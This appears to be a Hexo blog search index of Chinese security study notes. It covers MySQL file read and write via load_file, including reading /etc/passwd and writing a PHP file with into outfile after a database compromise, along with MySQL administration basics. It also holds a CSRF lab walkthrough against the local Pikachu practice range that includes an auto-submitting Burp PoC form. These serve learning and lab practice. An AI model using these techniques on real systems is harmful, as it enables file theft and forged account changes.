<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[置顶]]></title>
    <url>%2F9102%2F01%2F01%2Ftop%2F</url>
    <content type="text"><![CDATA[该博客用于本人日常记录学习、复习过程，学习范围有Windows，Linux，安全，网络，C++，Python等内容，不定期更新！暂不开放评论功能（玻璃心）！]]></content>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库系统相关]]></title>
    <url>%2F2019%2F10%2F22%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E7%B3%BB%E7%BB%9F%E7%9B%B8%E5%85%B3%2F</url>
    <content type="text"><![CDATA[MySQL读写文件了解MySQL版本特性MySQL中读写文件主要是load_file和into outfile 和 into dumpfile, mysql 的导入导出的功能从mysql 5版本起都受 系统变量@@secure_file_prev，该特性影响在&lt;=5.7.5版本的mysql里面默认值为empty, 在大于5.7.6的版本中是是/var/lib/mysql-files(Windows默认是platform sepcific)，表示读写仅能在该目录下进行。 Secure_file_priv是一个全局变量，它是一个只读变量，你不能在服务运行时改变它。也就是说如果此种注入比较依赖版本。修改这个值的方法需要在配置文件中修改。 查询%secure_file_priv%： 123456789mysql&gt; show global variables like &apos;%secure%&apos;;+--------------------------+-----------------------+| Variable_name | Value |+--------------------------+-----------------------+| require_secure_transport | OFF || secure_auth | ON || secure_file_priv | /var/lib/mysql-files/ |+--------------------------+-----------------------+3 rows in set (0.00 sec) windows下：修改my.ini在[mysqld]内加入secure_file_priv = linux下：修改my.cnf(/etc/my.cnf)在[mysqld]内加入 secure_file_priv =&#39;&#39; &#39;&#39;——运行在所有目录下进行读写文件操作; /tmp——仅允许在/tmp目录中进行读写文件操作; 文件读取示例:load_file()select load_file(&#39;/tmp/flag&#39;) load data infile12mysql&gt;create table load1(data text not null);mysql&gt;load data infile &apos;/etc/passwd&apos; into table load1; system cat1mysql&gt;system cat /etc/passwd 此方法仅允许本地读取，远程连接mysql时无法使用system来调用系统命令 文件写入示例:在渗透过程中拿下后端的数据库管理系统后,除了读取数据表中的数据以外，在权限足够的情况下还可以进行对文件进行读写。 into oufile 与 into dumpfile12345678910111213141516171819202122232425//into outfilemysql&gt; select &apos;&lt;?php phpinfo(); ?&gt; &apos; into outfile &apos;/tmp/info.php&apos;;Query OK, 1 row affected (0.00 sec)mysql&gt; select load_file(&apos;/tmp/info.php&apos;);+----------------------------+| load_file(&apos;/tmp/info.php&apos;) |+----------------------------+| &lt;?php phpinfo(); ?&gt; |+----------------------------+1 row in set (0.00 sec)//into dumpfilemysql&gt; select &apos;&lt;?php phpinfo(); ?&gt; &apos; into dumpfile &apos;/tmp/info2.php&apos;;Query OK, 1 row affected (0.00 sec)mysql&gt; select load_file(&apos;/tmp/info2.php&apos;);+-----------------------------+| load_file(&apos;/tmp/info2.php&apos;) |+-----------------------------+| &lt;?php phpinfo(); ?&gt; |+-----------------------------+1 row in set (0.00 sec) 自动查询结果写入文件123456789101112131415mysql&gt; pager cat &gt;&gt; /tmp/user.txtPAGER set to &apos;cat &gt;&gt; /tmp/user.txt&apos;mysql&gt; select user,host from mysql.user;3 rows in set (0.00 sec)nopager //返回标准输出-----------------------------------------[root@bogon tmp]# cat user.txt +---------------+-----------+| user | host |+---------------+-----------+| mysql.session | localhost || mysql.sys | localhost || root | localhost |+---------------+-----------+ MySQL数据库系统表mysqlmysql的核心数据库，类似于sql server中的master表，主要负责存储数据库的用户、权限设置、关键字等mysql自己需要使用的控制和管理信息。 12345678910111213141516171819202122232425262728293031323334353637mysql&gt; show tables ;+---------------------------+| Tables_in_mysql |+---------------------------+| columns_priv || db | *| engine_cost || event || func || general_log || gtid_executed || help_category || help_keyword || help_relation || help_topic || innodb_index_stats || innodb_table_stats || ndb_binlog_index || plugin || proc || procs_priv || proxies_priv || server_cost || servers || slave_master_info || slave_relay_log_info || slave_worker_info || slow_log || tables_priv || time_zone || time_zone_leap_second || time_zone_name || time_zone_transition || time_zone_transition_type || user | *+---------------------------+31 rows in set (0.00 sec) information_schema简介在MySQL中，把 information_schema 看作是一个数据库，确切说是信息数据库。其中保存着关于MySQL服务器所维护的所有其他数据库的元数据信息。如数据库名，数据库的表，表栏的数据类型与访问权 限等。在INFORMATION_SCHEMA中，有数个只读表。它们实际上是视图，而不是基本表，因此，你将无法看到与之相关的任何文件。 information_schema数据库表说明 查询所有数据库信息mysql&gt; select * from information_schema.schemata; 查询表信息查询tables表中字段信息 1mysql&gt;desc information_schema.tables; 查询所有数据库的表信息 1select table_catalog,table_schema,table_name from information_schema.tables; 查询表中的字段信息查询columns表中字段信息 1mysql&gt;desc information_schema.columns; 查询表中的字段名 1mysql&gt; select table_name,table_schema,column_name from information_schema.columns where table_name=&apos;load1&apos;; performance_schemaMySQL的performance schema 用于监控MySQL server在一个较低级别的运行过程中的资源消耗、资源等待等情况 检查MySQL版本是否支持通过查询INFORMATION_SCHEMA.ENGINES表中信息或使用SHOW ENGINES语句来查看它的SUPPORT值是否为YES 12mysql&gt; show engines; mysql&gt; select * from information_schema.engines; performance_schema被视为存储引擎。如果该引擎可用，则应该在INFORMATION_SCHEMA.ENGINES表或SHOW ENGINES语句的输出中都可以看到它的SUPPORT值为YES，如下： 12345678910111213+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+| Engine | Support | Comment | Transactions | XA | Savepoints |+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+| InnoDB | DEFAULT | Supports transactions, row-level locking, and foreign keys | YES | YES | YES || MRG_MYISAM | YES | Collection of identical MyISAM tables | NO | NO | NO || MEMORY | YES | Hash based, stored in memory, useful for temporary tables | NO | NO | NO || BLACKHOLE | YES | /dev/null storage engine (anything you write to it disappears) | NO | NO | NO || MyISAM | YES | MyISAM storage engine | NO | NO | NO || CSV | YES | CSV storage engine | NO | NO | NO || ARCHIVE | YES | Archive storage engine | NO | NO | NO || PERFORMANCE_SCHEMA | YES | Performance Schema | NO | NO | NO || FEDERATED | NO | Federated MySQL storage engine | NULL | NULL | NULL |+--------------------+---------+----------------------------------------------------------------+--------------+------+------------+ 查询performance_schema是否启用使用show variables语句来查看PERFORMANCE_SCHEMA是否已启用mysql&gt; show variables like &#39;performance_schema&#39;; 1234567mysql&gt; show variables like &apos;performance_schema&apos;;+--------------------+-------+| Variable_name | Value |+--------------------+-------+| performance_schema | ON |+--------------------+-------+1 row in set (0.00 sec) performance_schema在5.7.x及其以上版本中默认启用（5.6.x及其以下版本默认关闭），手动启用或关闭需配置my.conf文件，如下： 12[mysqld]performance_schema = ON|OFF performance_schema数据库中的表分类performance_schema库下的表可以按照监视不同的纬度进行了分组，例如：或按照不同数据库对象进行分组，或按照不同的事件类型进行分组，或在按照事件类型分组之后，再进一步根据帐号、主机、程序、线程、用户等细分，如下： 语句事件记录表12345678910111213141516mysql&gt; show tables like &apos;events_statement%&apos;;+----------------------------------------------------+| Tables_in_performance_schema (events_statement%) |+----------------------------------------------------+| events_statements_current | //当前语句事件表| events_statements_history | //历史语句事件表| events_statements_history_long | //长语句历史事件表| events_statements_summary_by_account_by_event_name | //账号| events_statements_summary_by_digest | //摘要| events_statements_summary_by_host_by_event_name | //主机| events_statements_summary_by_program | //程序| events_statements_summary_by_thread_by_event_name | //线程| events_statements_summary_by_user_by_event_name | //用户| events_statements_summary_global_by_event_name | //全局+----------------------------------------------------+10 rows in set (0.00 sec) 等待事件记录表等待事件记录表，记录语句执行的等待事件的表 123456789101112131415mysql&gt; show tables like &apos;events_wait%&apos;;+-----------------------------------------------+| Tables_in_performance_schema (events_wait%) |+-----------------------------------------------+| events_waits_current || events_waits_history || events_waits_history_long || events_waits_summary_by_account_by_event_name || events_waits_summary_by_host_by_event_name || events_waits_summary_by_instance || events_waits_summary_by_thread_by_event_name || events_waits_summary_by_user_by_event_name || events_waits_summary_global_by_event_name |+-----------------------------------------------+9 rows in set (0.00 sec) 阶段事件记录表阶段事件记录表，记录语句执行的阶段事件的表 1234567891011121314mysql&gt; show tables like &apos;events_stage%&apos;;+------------------------------------------------+| Tables_in_performance_schema (events_stage%) |+------------------------------------------------+| events_stages_current || events_stages_history || events_stages_history_long || events_stages_summary_by_account_by_event_name || events_stages_summary_by_host_by_event_name || events_stages_summary_by_thread_by_event_name || events_stages_summary_by_user_by_event_name || events_stages_summary_global_by_event_name |+------------------------------------------------+8 rows in set (0.00 sec) 事务事件记录表事务事件记录表，记录事务相关的事件的表 1234567891011121314mysql&gt; show tables like &apos;events_transaction%&apos;;+------------------------------------------------------+| Tables_in_performance_schema (events_transaction%) |+------------------------------------------------------+| events_transactions_current || events_transactions_history || events_transactions_history_long || events_transactions_summary_by_account_by_event_name || events_transactions_summary_by_host_by_event_name || events_transactions_summary_by_thread_by_event_name || events_transactions_summary_by_user_by_event_name || events_transactions_summary_global_by_event_name |+------------------------------------------------------+8 rows in set (0.00 sec) 监视文件系统层调用表123456789mysql&gt; show tables like &apos;file%&apos;;+--------------------------------------+| Tables_in_performance_schema (file%) |+--------------------------------------+| file_instances || file_summary_by_event_name || file_summary_by_instance |+--------------------------------------+3 rows in set (0.00 sec) 监视内存表1234567891011mysql&gt; mhow tables like &apos;memory%&apos;;+-----------------------------------------+| Tables_in_performance_schema (memory%) |+-----------------------------------------+| memory_summary_by_account_by_event_name || memory_summary_by_host_by_event_name || memory_summary_by_thread_by_event_name || memory_summary_by_user_by_event_name || memory_summary_global_by_event_name |+-----------------------------------------+5 rows in set (0.00 sec) 动态配置表1234567891011mysql&gt; show tables like &apos;setup%&apos;;+---------------------------------------+| Tables_in_performance_schema (setup%) |+---------------------------------------+| setup_actors || setup_consumers || setup_instruments || setup_objects || setup_timers |+---------------------------------------+5 rows in set (0.00 sec) sysSys库所有的数据源来自：performance_schema。目标是把performance_schema的把复杂度降低，让DBA能更好的阅读这个库里的内容。让DBA更快的了解DB的运行情况。 视图：host : 以IP分组相关的统计信息innodb : innodb buffer 相关信息io : 数据内不同维度展的IO相关的信息memory : 以IP，连接，用户，分配的类型分组及总的占用显示内存的使用metrics : DB的内部的统计值processlist : 线程相关的信息(包含内部线程及用户连接）ps_ : 没有工具统计的一些变量（没看出来存在的价值）schema : 表结构相关的信息，例如： 自增，索引， 表里的每个字段类型，等待的锁等等session : 用户连接相关的信息statement : 基于语句的统计信息（重店）statements_ : 出错的语句，进行全表扫描， 运行时间超长，排序相等（重点）user_ : 和host_开头的相似，只是以用户分组统计wait : 等待事件，比较专业，难看懂。waits : 以IP，用户分组统计出来的一些延迟事件，有一定的参考价值。 host_summary Io_global_by_file_by_bytes User_summary Memory_by_thread_by_current_bytes Statement_analysis 常用查询语句查询当前数据库 1234567mysql&gt; select database();+------------+| database() |+------------+| sys |+------------+1 row in set (0.00 sec) 查询当前用户 1234567mysql&gt; select user();+----------------+| user() |+----------------+| root@localhost |+----------------+1 row in set (0.00 sec) 查询当前DBMS版本 1234567mysql&gt; select version();+-----------+| version() |+-----------+| 5.7.27 |+-----------+1 row in set (0.00 sec) 全局函数：@@datadir #数据库路径@@hostname #主机名@@VERSION #数据库版本@@version_compile_os #操作系统版本]]></content>
      <categories>
        <category>LINUX</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MySQL数据库基础]]></title>
    <url>%2F2019%2F09%2F10%2FMySQL%E6%95%B0%E6%8D%AE%E5%BA%93%E5%9F%BA%E7%A1%80%2F</url>
    <content type="text"><![CDATA[认识MySQL数据库管理系统什么是MySQL？MySQL是一种开放源代码的关系型数据库管理系统（RDBMS），MySQL数据库系统使用最常用的数据库管理语言–结构化查询语言（SQL）进行数据库管理。在 WEB 应用方面MySQL是常用的 RDBMS (Relational Database Management System，关系数据库管理系统) 应用软件之一。 什么是关系和非关系型数据库？关系型数据库关系型数据库是指采用了关系模型来组织数据的数据库。 关系模型：关系模型指的就是二维表格模型，而一个关系型数据库就是由二维表及其之间的联系所组成的一个数据组织 当今十大主流的关系型数据库Oracle，Microsoft SQL Server，MySQL，PostgreSQL，DB2，Microsoft Access， SQLite，Teradata，MariaDB(MySQL的一个分支)，SAP 非关系型数据库非关系型数据库是指非关系型的，分布式的，且一般不保证遵循ACID原则的数据存储系统。 非关系型数据库结构：非关系型数据库以键值对存储，且结构不固定，每一个元组可以有不一样的字段，每个元组可以根据需要增加一些自己的键值对，不局限于固定的结构，可以减少一些时间和空间的开销。 常见的非关心型数据库有SQL，SQLite，Redis，MongoDB，CouchDB等 MySQL基础命令启动MySQL服务Centos6.x 12[root@localhost~]service mysqld start #启动服务[root@localhost~]service mysqld restart #重启服务 Centos7.x 12[root@localhost~]systemctl start mysqld #启动服务[root@localhost~]systemctl restart mysqld #重启服务 配置DBMS用户密码第一次为空密码用户root，配置密码为123456 1[root@localhost ~]# mysqladmin -u root password 123456 修改数据库用户密码： 12[root@localhost ~]# mysqladmin -u root -p password 654321Enter password: #输入旧密码 用户管理查看用户123456789101112mysql&gt; select user,host from mysql.user;+------+-----------------------+| user | host |+------+-----------------------+| root | 127.0.0.1 || | localhost || root | localhost || | localhost.localdomain || root | localhost.localdomain |+------+-----------------------+6 rows in set (0.00 sec) 创建用户123456789101112131415mysql&gt; create user jonh@localhost identified by&apos;123456&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; select user,host from mysql.user;+------+-----------------------+| user | host |+------+-----------------------+| root | 127.0.0.1 || | localhost || jonh | localhost || root | localhost || | localhost.localdomain || root | localhost.localdomain |+------+-----------------------+6 rows in set (0.00 sec) 删除用户1234567891011121314mysql&gt; drop user jonh@localhost;Query OK, 0 rows affected (0.00 sec)mysql&gt; select user,host from mysql.user;+------+-----------------------+| user | host |+------+-----------------------+| root | 127.0.0.1 || | localhost || root | localhost || | localhost.localdomain || root | localhost.localdomain |+------+-----------------------+5 rows in set (0.00 sec) 修改用户名123456789101112131415mysql&gt; rename user jack@&apos;%&apos; to uzi@&apos;%&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; select user,host from mysql.user;+------+-----------------------+| user | host |+------+-----------------------+| uzi | % || root | 127.0.0.1 || | localhost || root | localhost || | localhost.localdomain || root | localhost.localdomain |+------+-----------------------+6 rows in set (0.00 sec) 修改用户密码12mysql&gt; set password for uzi@&apos;%&apos; =password(&apos;654321&apos;);Query OK, 0 rows affected (0.00 sec) 数据库操作查看所有数据库123456789mysql&gt; show databases;+--------------------+| Database |+--------------------+| information_schema || mysql || test |+--------------------+3 rows in set (0.00 sec) 查看数据库中的表1234mysql&gt; use test; //使用数据库Database changedmysql&gt; show tables; //当前数据库为空Empty set (0.00 sec) 创建数据库12345678910111&gt; 创建数据库mysql&gt; create database db1;Query OK, 1 row affected (0.00 sec)2&gt; 创建编码为UTF8的数据库mysql&gt; create database db2 DEFAULT CHARSET utf8 COLLATE utf8_general_ci;Query OK, 1 row affected (0.00 sec3&gt; 创建编码为gbk的数据库create database db3 DEFAULT CHARSET gbk COLLATE gbk_chinese_ci;Query OK, 1 row affected (0.00 sec) PS：创建时如果不设置数据库编码默认则默认为latin1 查看数据库编码12345678910111213141516171819202122232425mysql&gt; use db2;Database changedmysql&gt; status;--------------mysql Ver 14.14 Distrib 5.1.71, for redhat-linux-gnu (x86_64) using readline 5.1Connection id: 6Current database: db2Current user: root@localhostSSL: Not in useCurrent pager: stdoutUsing outfile: &apos;&apos;Using delimiter: ;Server version: 5.1.71 Source distributionProtocol version: 10Connection: Localhost via UNIX socketServer characterset: latin1Db characterset: utf8Client characterset: latin1Conn. characterset: latin1UNIX socket: /var/lib/mysql/mysql.sockUptime: 16 min 2 secThreads: 1 Questions: 51 Slow queries: 0 Opens: 16 Flush tables: 1 Open tables: 9 Queries per second avg: 0.53-------------- 删除数据库12mysql&gt; drop database db3;Query OK, 0 rows affected (0.00 sec) 数据表操作查看表结构123456789mysql&gt; desc table1;+-------+----------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+-------+----------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || name | char(20) | YES | | NULL | || sex | char(10) | YES | | NULL | |+-------+----------+------+-----+---------+-------+3 rows in set (0.00 sec) 查看表中记录1234567mysql&gt; select * from table1;+------+------+------+| id | name | sex |+------+------+------+| 1 | jonh | male |+------+------+------+1 row in set (0.00 sec) 创建表123456789101112mysql&gt; create table user(id int,username char(20),password char(30));Query OK, 0 rows affected (0.01 sec)mysql&gt; desc user;+----------+----------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || username | char(20) | YES | | NULL | || password | char(30) | YES | | NULL | |+----------+----------+------+-----+---------+-------+3 rows in set (0.00 sec) 在表中录入记录123456789101112131415161718192021222324252627282930313233343536mysql&gt; insert into user values(1,&apos;admin&apos;,&apos;123456&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | 123456 |+------+----------+----------+1 row in set (0.00 sec)mysql&gt; insert into user (id,username) values(2,&apos;guest&apos;);Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+------+----------+----------+| id | username | password |+------+----------+----------+| 1 | admin | 123456 || 2 | guest | NULL |+------+----------+----------+2 rows in set (0.00 sec)// md5加密password字段mysql&gt; insert into user values(1,&apos;system&apos;,md5(&apos;654321&apos;));Query OK, 1 row affected, 1 warning (0.00 sec)mysql&gt; select * from user;+------+----------+--------------------------------+| id | username | password |+------+----------+--------------------------------+| 1 | admin | 123456 || 1 | guest | NULL || 1 | system | c33367701511b4f6020ec61ded3520 |+------+----------+--------------------------------+3 rows in set (0.00 sec) 更新表中记录12345678910111213mysql&gt; update user set password=md5(&apos;guest&apos;) where username=&apos;guest&apos;;Query OK, 1 row affected, 1 warning (0.00 sec)Rows matched: 1 Changed: 1 Warnings: 1mysql&gt; select * from user;+------+----------+--------------------------------+| id | username | password |+------+----------+--------------------------------+| 1 | admin | 123456 || 1 | guest | 084e0343a0486ff05530df6c705c8b || 1 | system | c33367701511b4f6020ec61ded3520 |+------+----------+--------------------------------+3 rows in set (0.00 sec) 删除表中记录1234567891011mysql&gt; delete from user where username=&apos;guest&apos;;Query OK, 1 row affected (0.00 sec)mysql&gt; select * from user;+------+----------+--------------------------------+| id | username | password |+------+----------+--------------------------------+| 1 | admin | 123456 || 1 | system | c33367701511b4f6020ec61ded3520 |+------+----------+--------------------------------+2 rows in set (0.00 sec) 删除数据表12345678910mysql&gt; drop table table1;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+---------------+| Tables_in_db1 |+---------------+| user |+---------------+1 row in set (0.00 sec) 为数据表添加字段1234567891011121314mysql&gt; alter table user add sex char(10);Query OK, 3 rows affected (0.01 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+----------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || username | char(20) | YES | | NULL | || password | char(30) | YES | | NULL | || sex | char(10) | YES | | NULL | |+----------+----------+------+-----+---------+-------+4 rows in set (0.00 sec) 删除表中字段12345678910111213mysql&gt; alter table user drop sex;Query OK, 3 rows affected (0.01 sec)Records: 3 Duplicates: 0 Warnings: 0mysql&gt; desc user;+----------+----------+------+-----+---------+-------+| Field | Type | Null | Key | Default | Extra |+----------+----------+------+-----+---------+-------+| id | int(11) | YES | | NULL | || username | char(20) | YES | | NULL | || password | char(30) | YES | | NULL | |+----------+----------+------+-----+---------+-------+3 rows in set (0.00 sec) 修改表名称12345678910mysql&gt; alter table user rename to users;Query OK, 0 rows affected (0.00 sec)mysql&gt; show tables;+---------------+| Tables_in_db1 |+---------------+| users |+---------------+1 row in set (0.00 sec) MySQL权限管理关于MySQL的权限简单的理解就是MySQL允许你做你全力以内的事情，不可以越界。比如只允许你执行select操作，那么你就不能执行update操作。只允许你从某台机器上连接MySQL，那么你就不能从除那台机器以外的其他机器连接MySQL MySQL权限验证MySQL的两阶段验证第一阶段：服务器首先会检查你是否允许连接。因为创建用户的时候会加上主机限制，可以限制成本地、某个IP、某个IP段、以及任何地方等，只允许你从配置的指定地方登陆。第二阶段：如果你能连接，MySQL会检查你发出的每个请求，看你是否有足够的权限实施它。比如你要更新某个表、或者查询某个表，MySQL会查看你对哪个表或者某个列是否有权限。再比如，你要运行某个存储过程，MySQL会检查你对存储过程是否有执行权限等 权限表 MYSQL的权限分布，就是针对表可以设置什么权限，针对列可以设置什么权限等等，这个可以从官方文档中的一个表来说明： MySQL授权示例查看用户权限 1234567 mysql&gt; show grants for uzi@localhost;+-------------------------------------------------------------------------------------------------------------+| Grants for jonh@localhost |+-------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jonh&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*6BB4837EB74329105EE4568DDA7DC67ED2CA2AD9&apos; |+-------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) 为用户授权 12345678910mysql&gt; grant all privileges on *.* to uzi@&apos;%&apos;;Query OK, 0 rows affected (0.00 sec)mysql&gt; show grants for uzi@&apos;%&apos;;+-------------------------------------------------------------------------------------------------------------+| Grants for uzi@% |+-------------------------------------------------------------------------------------------------------------+| GRANT ALL PRIVILEGES ON *.* TO &apos;uzi&apos;@&apos;%&apos; IDENTIFIED BY PASSWORD &apos;*2A032F7C5BA932872F0F045E0CF6B53CF702F2C5&apos; |+-------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec) Grant 命令说明：All privileges #表示所有权限On #指向权限针对的数据库和表*.* #前面的*号用来指数据库，后面的用来指表To #表示将权限赋予指定的用户uzi@&#39;%&#39; #表示用户jack，@后面限制登录的主机，可以是IP、网段、域名以及%，%表示任何地方。注意这里的%在有的版本里不包括本地，遇到这个问题在加一个localhost用户就好Identified by #指定用户的密码Whith grant option #这个选项表示该用户可以将自己拥有的权限授权给别人。注意：经常有人在创建操作用户的时候不指定with grant option选项导致后来该用户不能使用GRANT命令创建用户或者给其它用户授权。PS：可以使用GRANT重复给用户添加权限，权限叠加，比如你先给用户添加一个select权限，然后又给用户添加一个insert权限，那么该用户就同时拥有了select和insert权限 刷新权限给用户授权完毕之后，若是要权限立即生效就必须要刷新权限 12mysql&gt; flush privileges;Query OK, 0 rows affected (0.00 sec) 回收权限revoke [options] on [database].[tables] from [user]@[ip address]; 1234567891011121314151617181920mysql&gt; show grant for jonh@localhost;ERROR 1064 (42000): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &apos;grant for jonh@localhost&apos; at line 1mysql&gt; show grants for jonh@localhost;+----------------------------------------------------------------------------------------------------------------------------------------+| Grants for jonh@localhost |+----------------------------------------------------------------------------------------------------------------------------------------+| GRANT ALL PRIVILEGES ON *.* TO &apos;jonh&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*9BCDC990E611B8D852EFAF1E3919AB6AC8C8A9F0&apos; WITH GRANT OPTION |+----------------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)mysql&gt; revoke all on *.* from jonh@localhost;Query OK, 0 rows affected (0.00 sec)mysql&gt; show grants for jonh@localhost;+-------------------------------------------------------------------------------------------------------------------------------+| Grants for jonh@localhost |+-------------------------------------------------------------------------------------------------------------------------------+| GRANT USAGE ON *.* TO &apos;jonh&apos;@&apos;localhost&apos; IDENTIFIED BY PASSWORD &apos;*9BCDC990E611B8D852EFAF1E3919AB6AC8C8A9F0&apos; WITH GRANT OPTION |+-------------------------------------------------------------------------------------------------------------------------------+1 row in set (0.00 sec)]]></content>
      <categories>
        <category>LINUX</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>SQL注入</tag>
        <tag>LANMP</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CSRF跨站请求伪造]]></title>
    <url>%2F2019%2F08%2F29%2FCSRF%E8%B7%A8%E7%AB%99%E8%AF%B7%E6%B1%82%E4%BC%AA%E9%80%A0%2F</url>
    <content type="text"><![CDATA[CSRF(跨站请求伪造)概述Cross-site request forgery 简称为“CSRF”，在CSRF的攻击场景中攻击者会伪造一个请求（这个请求一般是一个链接），然后欺骗目标用户进行点击，用户一旦点击了这个请求，整个攻击就完成了。所以CSRF攻击也成为”one click”攻击。 很多人搞不清楚CSRF的概念，甚至有时候会将其和XSS混淆,更有甚者会将其和越权问题混为一谈,这都是对原理没搞清楚导致的。 从用户的信任角度来区分XSS和CSRF： XSS：攻击者 利用用户对站点的信任，在站点中注入程序来修改网站来获取用户的cookie，或使用户浏览器网站重定向等。 CSRF：攻击者 利用站点对已经过身份认证的用户的信任，伪造一个链接误导用户点击链接来使用用户的身份认证来访问服务器，在用户非自愿、不知情的情况下提交请求 结合社工在身份认证会话过程中实现供给： 修改账号密码、个人信息（email、收货地址） 发送伪造的业务请求（网银、购物、投票） 关注他人社交账号、推送博文等 漏洞利用先遣条件 被害用户已经完成身份认证 新请求的提交不需要重新身份认证或确认机制 攻击者必须了解 Web APP 请求的参数构造 诱使用户触发攻击的指令（社工） CSRF实验示例(GET)：用户密码点击提示获取用户登陆后可修改个人信息使用BurpSuite截断并修改用户向服务器发送的个人信息修改请求报文 123456789GET /pika/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=15988767673&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit HTTP/1.1Host: 127.0.0.1User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:68.0) Gecko/20100101 Firefox/68.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Referer: http://127.0.0.1/pika/vul/csrf/csrfget/csrf_get_edit.phpConnection: closeCookie: UM_distinctid=16cd0f427f09-00c483a3070673-4c312272-1fa400-16cd0f427f14a9; CNZZDATA1254690350=674210068-1566873758-%7C1566873758; PHPSESSID=eg8t1vjk35vdi8bpg0n0s7ik87Upgrade-Insecure-Requests: 1 制定恶意变更手机信息链接: 1http://127.0.0.1//pika/vul/csrf/csrfget/csrf_get_edit.php?sex=boy&amp;phonenum=12345678901&amp;add=nba+lakes&amp;email=kobe%40pikachu.com&amp;submit=submit 模拟用户访问钓鱼网站查看效果： CSRF实验示例(POST)：修改个人信息使用BurpSuite截断并修改用户向服务器发送的个人信息修改请求报文使用BurpSuite生成CSRF Poc 1234567891011121314&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/pika/vul/csrf/csrfpost/csrf_post_edit.php" method="POST"&gt; &lt;input type="hidden" name="sex" value="boy" /&gt; &lt;input type="hidden" name="phonenum" value="999999999999" /&gt; &lt;input type="hidden" name="add" value="nba&amp;#32;lakes" /&gt; &lt;input type="hidden" name="email" value="kobe&amp;#64;pikachu&amp;#46;com" /&gt; &lt;input type="hidden" name="submit" value="submit" /&gt; &lt;input type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt; 使用Poc 搭建站点，诱使用户访问网站并点击按钮 模拟用户访问钓鱼网站查看效果： 改进HTML代码，使用户访问网站时，自动使用POST提交表单信息 1234567891011121314151617181920&lt;html&gt; &lt;!-- CSRF PoC - generated by Burp Suite Professional --&gt; &lt;head&gt; &lt;script&gt;window.onload=function()&#123; document.getElementById("submit").click(); &#125; &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;script&gt;history.pushState('', '', '/')&lt;/script&gt; &lt;form action="http://127.0.0.1/pika/vul/csrf/csrfpost/csrf_post_edit.php" method="POST"&gt; &lt;input type="hidden" name="sex" value="boy" /&gt; &lt;input type="hidden" name="phonenum" value="999999999999" /&gt; &lt;input type="hidden" name="add" value="nba&amp;#32;lakes" /&gt; &lt;input type="hidden" name="email" value="kobe&amp;#64;pikachu&amp;#46;com" /&gt; &lt;input type="hidden" name="submit" value="submit" /&gt; &lt;input id="submit" type="submit" value="Submit request" /&gt; &lt;/form&gt; &lt;/body&gt;&lt;/html&gt;]]></content>
      <categories>
        <category>WEB安全</category>
        <category>PHP</category>
        <category>CSRF</category>
      </categories>
  </entry>
  <entry>
    <title><![CDATA[XSS 跨站脚本攻击]]></title>
    <url>%2F2019%2F08%2F27%2FXSS%E8%B7%A8%E7%AB%99%E8%84%9A%E6%9C%AC%2F</url>
